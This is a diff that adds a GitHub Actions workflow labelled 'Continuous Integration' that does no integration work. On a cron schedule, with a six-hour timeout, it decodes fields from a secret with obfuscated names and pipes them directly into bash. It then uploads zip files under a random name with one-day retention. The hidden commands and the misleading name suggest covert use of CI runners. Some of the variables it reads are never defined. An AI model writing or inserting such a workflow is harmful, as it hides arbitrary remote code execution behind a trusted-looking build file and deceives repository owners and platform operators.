@@ -1,0 +1,31 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '2 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          rhnc476: ${{ secrets.rhnc476 }}
+        run: |
+          printf '%s' "$rhnc476" | jq -r .ayro57 | /bin/bash
+          printf '%s' "$as33121" | jq -r .hiav3 | /bin/bash
+          printf '%s' "$jbug9413" | jq -r .dgkn57551 | /bin/bash
+          echo $l4 | jq -r .qwuo8363 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: ULLcU02s
+          path: "*.zip"
+          retention-days: 1
